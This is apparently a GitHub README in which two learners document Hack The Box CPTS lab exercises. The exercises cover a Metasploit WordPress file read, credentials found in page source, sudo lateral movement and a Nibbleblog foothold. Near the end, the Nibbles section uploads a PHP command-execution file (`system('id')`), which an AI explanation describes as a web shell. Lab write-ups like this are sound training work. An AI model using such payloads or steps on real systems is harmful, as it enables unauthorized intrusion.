# 🏴 Hack The Box — CPTS Certification Journey

Two hackers working toward the **Hack The Box Certified Penetration Testing Specialist (CPTS)** certification. This repo documents our progress, methodology, and flags along the way.

## Table of Contents

| # | Section | Topic |
|---|---------|-------|
| 8 | [Service Scanning](#-section-8--service-scanning) | WordPress file read exploit |
| 9 | [Web Enumeration](#-section-9--web-enumeration) | robots.txt, source code creds |
| 11 | [Privilege Escalation](#-section-11--privilege-escalation) | sudo lateral movement |
| 17 | [Nibbles — Initial Foothold](#-section-17---nibbles--initial-foothold) | Nibbleblog exploitation |

---

## 📦 Section 8 — Service Scanning

> **Objective:** Identify services running on the target, find public exploits, and retrieve `/flag.txt`.

### Reconnaissance

**Target:** `http://154.57.164.72:31179/`

Navigating to the target reveals an information disclosure — one of my most favorite (and common) pentest findings:

![Service Scanning - Information Disclosure](images/section8box.png)

The exposed version info points us toward a known WordPress vulnerability. Using AI-assisted research, I identify the relevant Metasploit module:

```
auxiliary/scanner/http/wp_simple_backup_file_read
```

### Exploitation via Metasploit

```bash
msf > use auxiliary/scanner/http/wp_simple_backup_file_read
msf > set RHOSTS 154.57.164.72
msf > set RPORT 31179
msf > set FILEPATH /flag.txt
msf > run

[+] File saved in: /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf > cat /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt

HTB{REDACTED}
```

✅ **Flag captured.**

---

## 🌐 Section 9 — Web Enumeration

> **Objective:** Identify services, find public exploits, and retrieve `/flag.txt`.

This section covers finding public exploits via Google dorking (`<technology> + exploit`), Searchsploit, and Metasploit.

### Nmap Scan

```bash
nmap -sV -p 30764 154.57.164.63
```

```
PORT      STATE SERVICE VERSION
30764/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### Web Server Exploration

Visiting the target shows a simple landing page:

![Web Enumeration - Landing Page](images/Section9.png)

The page source is a basic HTML page with no interesting content — just a styled "Welcome to HTB Academy Blog" heading.

### Discovering Hidden Pages

Checking `robots.txt` at `http://154.57.164.63:30764/robots.txt`:

```text
User-agent: *
Disallow: /admin-login-page.php
```

You disallow robots, but not humans — let's check it out.

![Admin Login Page](images/2.png)

### Source Code Analysis

Inspecting the login page source reveals hardcoded credentials in an HTML comment:

```html
<!-- TODO: remove test credentials admin:password123 -->
```

✅ **Flag:** `HTB{REDACTED}`

---

## 🔐 Section 11 — Privilege Escalation

> **Objective:** SSH into the server, pivot to `user2`, and retrieve `/home/user2/flag.txt`.

### Reconnaissance

```bash
nmap -sV -Pn 154.57.164.64
```

```
PORT   STATE SERVICE VERSION
53/tcp open  domain?
```

### Initial Access

SSH in as `user1` on the provided port:

```bash
ssh -p 30798 user1@154.57.164.64
```

### Privilege Enumeration

Checking what `user1` can run with elevated privileges:

```bash
user1@host:~$ sudo -l
```

```
User user1 may run the following commands:
    (user2 : user2) NOPASSWD: /bin/bash
```

`user1` can run `/bin/bash` as `user2` without a password — easy lateral move.

### Lateral Movement

```bash
user1@host:~$ sudo -u user2 /bin/bash
user2@host:~$ cat /home/user2/flag.txt
HTB{REDACTED}
```

✅ **Flag captured.**


## 🍪 Section 17 — Nibbles — Initial Foothold

> **Objective:** Gain a foothold on the target and submit the `user.txt` flag.

### Nmap Scan

```bash
nmap -sV -Pn --open 10.129.117.82
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### Web Server Exploration

Navigating to the target shows a bare page:

![Nibbles - Frontend](images/3.png)

The page source leaks a hidden directory:

```html
<b>Hello world!</b>
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Sure, "nothing interesting" 😏

### Nibbleblog Discovery

Navigating to `/nibbleblog/` reveals a blog powered by **Nibbleblog**:

![Nibbles - Nibbleblog](images/4.png)

Key findings from the page source:
- CMS: **Nibbleblog**
- Admin panel likely at `/nibbleblog/admin/`
- Plugins loaded: `my_image`, `hello_world`, `categories`, `latest_posts`, `pages`

### Next Steps

Discovered `/admin` directory — exploring for authentication bypass or known Nibbleblog exploits.

### Directory enumeration


At `http://10.129.123.83/nibbleblog/content/private/users.xml`, I was able to find the admin user, although this isn't exactly shocking

```xml
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```

### Gobuster
```bash
➜  ~ gobuster dir -u http://10.129.123.83/nibbleblog/ -w /Users/P3153190/Wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.123.83/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/P3153190/Wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 308]
.htaccess            (Status: 403) [Size: 308]
.hta                 (Status: 403) [Size: 303]
README               (Status: 200) [Size: 4628]
admin                (Status: 301) [Size: 325] [--> http://10.129.123.83/nibbleblog/admin/]
admin.php            (Status: 200) [Size: 1401]
content              (Status: 301) [Size: 327] [--> http://10.129.123.83/nibbleblog/content/]
index.php            (Status: 200) [Size: 2987]
languages            (Status: 301) [Size: 329] [--> http://10.129.123.83/nibbleblog/languages/]
plugins              (Status: 301) [Size: 327] [--> http://10.129.123.83/nibbleblog/plugins/]
themes               (Status: 301) [Size: 326] [--> http://10.129.123.83/nibbleblog/themes/]
Progress: 4727 / 4727 (100.00%)
===============================================================
Finished
===============================================================
```

### Nikto
~~~bash
➜  ~ nikto -h 10.129.123.83
- Nikto v2.6.0
---------------------------------------------------------------------------
+ Target IP:          10.129.123.83
+ Target Hostname:    10.129.123.83
+ Target Port:        80
+ Platform:           Linux/Unix
+ Start Time:         2026-05-18 09:54:07 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Unable to load valid checks!
+ ERROR: Unable to open database file db_favicon: .
+ ERROR: Unable to open database file db_headers_common: .
+ ERROR: Unable to open database file db_content_search: .
+ ERROR: Unable to open database file db_realms: .
+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+ ERROR: Unable to open database file db_multiple_index: .
+ 559 requests: 0 errors and 0 items reported on the remote host
+ End Time:           2026-05-18 09:55:40 (GMT-6) (93 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
~~~

### searchsploit
```bash
➜  WhatWeb git:(master) searchsploit nibbleblog
```

```bash
Nibbleblog 3 - Multiple SQL Injections                                                                  | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                   | php/remote/38489.rb
```

I admit at this point, I was at a loss of what to do, so I followed the section. They eventually tried `admin/nibbles` as the password and thats how they got in lol. 

I continued following the tutorial: 
We can use the image plugin to upload the following PHP file
```php
<?php system('id'); ?>
```

### Gemini:
That line of code executes a system command on the server and outputs the result directly to the browser.
Here is the breakdown of exactly what is happening:

`<?php ... ?>`: These are the opening and closing tags that tell the server to interpret the code inside as PHP.

`system(...)`: This is a built-in PHP function used to execute an external program or command-line instruction on the underlying operating system (like Linux or Windows) hosting the website.

`'id'`: This is the specific command being passed to the system. On Unix-like systems (Linux, macOS), id is a command that prints the real and effective user and group IDs of the current user. 

---------------

#### What is the practical result?

When this script runs, it asks the server's operating system, "Who am I running as right now?"

The server will execute the command and display something like this on the webpage:
Plaintext

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

(Note: www-data is the standard default user account for web servers like Apache or Nginx on Debian/Ubuntu systems.)

---------------

⚠️ Security Warning: Remote Code Execution (RCE)

If you found this code inside an existing file on your website and you didn't put it there, your server has likely been compromised.

Attackers frequently use the system() function (along with similar functions like exec(), passthru(), or shell_exec()) as a web shell. If an attacker can manipulate what goes inside that function, they can gain complete control over your server, view sensitive files, or install malware.

![alt text](images/5.png)


